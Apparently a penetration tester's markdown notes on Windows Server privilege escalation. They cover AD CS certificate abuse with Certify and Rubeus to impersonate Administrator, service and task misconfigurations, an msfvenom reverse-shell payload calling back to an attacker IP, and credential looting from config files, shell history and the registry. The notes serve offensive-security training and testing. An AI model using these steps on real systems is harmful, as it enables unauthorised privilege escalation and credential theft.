---
title: Windows Server privilege-escalation notes
---

- [1. Automatic tools](#1-automatic-tools)
- [2. AD Certificate Services](#2-ad-certificate-services)
- [3. Misconfigurations](#3-misconfigurations)
  - [3.1. Scheduled tasks](#31-scheduled-tasks)
  - [3.2. Services](#32-services)
    - [3.2.1. Executable permissions](#321-executable-permissions)
    - [3.2.2. Unquoted paths](#322-unquoted-paths)
    - [3.2.3. Service permissions](#323-service-permissions)
  - [3.3. AlwaysInstallElevated](#33-alwaysinstallelevated)
  - [3.4. Users](#34-users)
    - [3.4.1. SeBackup and SeRestore](#341-sebackup-and-serestore)
    - [3.4.2. SeTakeOwnership](#342-setakeownership)
    - [3.4.3. SeImpersonate and SeAssignPrimaryToken](#343-seimpersonate-and-seassignprimarytoken)
    - [3.4.4. Unpatched software](#344-unpatched-software)
- [4. Credentials looting](#4-credentials-looting)
  - [4.1. Files](#41-files)
    - [4.1.1. IIS configuration](#411-iis-configuration)
    - [4.1.2. Unattended Windows installations](#412-unattended-windows-installations)
  - [4.2. Shell history](#42-shell-history)
  - [4.3. Memory-saved credentials](#43-memory-saved-credentials)
  - [4.4. SSH software](#44-ssh-software)

## 1. Automatic tools

- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [PrivescCheck](https://github.com/itm4n/PrivescCheck)
- [WES-NG](https://github.com/bitsadmin/wesng) - run `systeminfo` and check for misconfiguration offline using `wes.py` script.
- Metasploit: `multi/recon/local_exploit_suggester` (when the shell is already established).

## 2. AD Certificate Services
Being within AD domain where the AD CS is installed, a domain user can request a X.509 certificate for different purposes (including AD authentication via PKINIT feature). AD CS has admin-defined **Certificate Templates** that specify available parameters and values of a requested certificate.

Most important values:

- CA Name - which server is the Certified Authority for the cert.
- Template Name - the name of the cert template.
- Enrollment Rights - who can request (which group of users) such a cert.
- PKI Extended Key Usage - what's the purpose of the cert.

`Certify` is a tool to enumerate and abuse misconfiguration in AD CS (vulnerable certificate templates).

```powershell
# Check possible vulnerabilities in AD certificates
Certify.exe find /vulnerable
```

If any user can enroll this certificate (e.g. _Domain Users_ group), its purpose is defined as _Client Authentication_ (an user can auth to AD using this cert) and ENROLLEE_SUPLIES_SUBJECT flag is set (subject of the cert is defined by enrollee)... **privilege escalation**! Any user can enroll the certificate for Administrator and use it to perform AD authentication.

```powershell
# Request an certificate for Administrator
Certify.exe request /ca:<ca-name> /template:<template-name> /altname:Administrator

# Request Kerberos TGT using the received certificate
Rubeus.exe asktgt /user:Administrator /certificate:<cert.pfx> /password:password /ptt

# Check if privilege escalation works (it might not work but look for NT hash)
dir \\<dc>\C$
```

Requesting TGT using the certificate (with `Rubeus`) should return user's NT hash that can be use to **pass-the-hash** (if PKINIT is enabled). It uses so-called user-to-user (u2u) auth - the user authenticates to itself using Kerberos and retrieves its NT hash.

**NOTE**: Certify.exe returns a `PEM` format certificate. It must be converted into the `PFX` format to use it with `Rubeus`:

```bash
openssl pkcs12 -in <cert.pem> -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out <cert.pfx>
```

> **RESOURCES**: [Awesome BlackHat explanation](https://www.youtube.com/watch?v=ejmAIgxFRgM), [corresponding blog post](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

Most `impacket` tools are able to work with TGT authentication.

## 3. Misconfigurations

### 3.1. Scheduled tasks
If an attacker is able to modify the `Task To Run` file, he can run a code with `Run As User` privileges.

```powershell
# List all scheduled tasks
schtasks /query /tn <task-name> /fo list /v

# Check file permissions
icacl <path>
```

### 3.2. Services

```bash
# Generate rev-shell service executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f exe-service -o my-service.exe
```

#### 3.2.1. Executable permissions
The executable associated with a service might have insecure permissions. The attacker modifing or replacing the executable can gain the privileges of the service's account.

```powershell
icacls <executable-path>                    # Show DACL of the executable
```

#### 3.2.2. Unquoted paths
If the service's executable points to an unquoted path with spaces, SCM tries to execute firt binary which is the first part of the unqoted path. This SCM feature is basically disgusting but it works. It allows an attacker to put malicious service binary in the "wrong" path and run it before a legit one will be executed.

Example:

```text
Path        : C:\MyPrograms\Disk Sorter.exe
Executed 1st: C:\MyPrograms\Disk.exe
Executed 2nd: C:\MyPrograms\Disk Sorter.exe
```

#### 3.2.3. Service permissions
The service DACL might allow to reconfigure service settings. This allows an attacker to point a malicious executable to the service and even change the account which the executable is run with.

To check a service DACL the [Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) tool might be necessary.

```powershell
accesschk64.exe -qlc <svc-name>             # Check the service DACL

# Reconfigure service: run :exe-path with Local SYSTEM account
sc.exe config <svc-name binPath= "<exe-path" obj= LocalSystem
```

### 3.3. AlwaysInstallElevated
`.msi` files are used to install applications on the system. They usually run with the privileges of the current user but sometimes it might be configured to run installation files with higher privileges from any user account. Malicious `.msi` files can be generated using `msfvenom` tool.

```powershell
# Check if AlwaysInstallElevated is set
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

# Execute an .msi file
msiexec /quiet /qn /i <path>
```

### 3.4. Users
Every user has some privileges and some of them might be used to perform privilege escalation:

- [List of all possible privileges](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
- [List of potentially dangerous privileges](https://github.com/gtworek/Priv2Admin)

Check current privileges: `whoami /priv`

#### 3.4.1. SeBackup and SeRestore
The `SeBackup` and `SeRestore` allow an user to read and write to **any file in the system**, ignoring any DACL. They are used to perform full backup of the system without requiring full admin privileges. Using these privileges an attacker is able to export SAM database and extract users hashes offline. More in: `post-exploitation`.

#### 3.4.2. SeTakeOwnership
The `SeTakeOwnership` privilege allows a user to take ownership of any object on the system. An attacker can search for a service running as SYSTEM and take ownership of the service's executable.

```powershell
# The ownership of the file
takeown /f <file>

# Grant full privileges to the file
icacls <file> /grant <username>:F

# Now you can replace this file with an malicious executable
```

#### 3.4.3. SeImpersonate and SeAssignPrimaryToken
These privileges allow a process to act on behalf of another user. It usually consists of being able to spawn a process under the security context of another user.

TBD...

#### 3.4.4. Unpatched software

```powershell
# List the installed software
wmic product get name,version,vendor
```

## 4. Credentials looting

### 4.1. Files

#### 4.1.1. IIS configuration
Configuration files of the IIS web server might store some credentials.

```cmd
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

#### 4.1.2. Unattended Windows installations
If the OS is installed remotely (unattended installation) there is a chance that the installation config file is still somwhere in the file system. It might include credentials.

```cmd
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

### 4.2. Shell history

```powershell
# To read history from cmd.exe
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

```powershell
# To read history from Powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### 4.3. Memory-saved credentials

```powershell
# Show saved credentials and accounts in a memory
cmdkey /list
```

> **NOTE**: Even if the credentials are not shown, you can use the `runas /savecred /user:<user> cmd.exe` command in order to use them from a memory.

### 4.4. SSH software
PuTTY is probably the most common SSH client for Windows in use. It often stores session parameters (e.g. proxy configuration) in the Windows registry.

```powershell
# Show PuTTY configuration
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
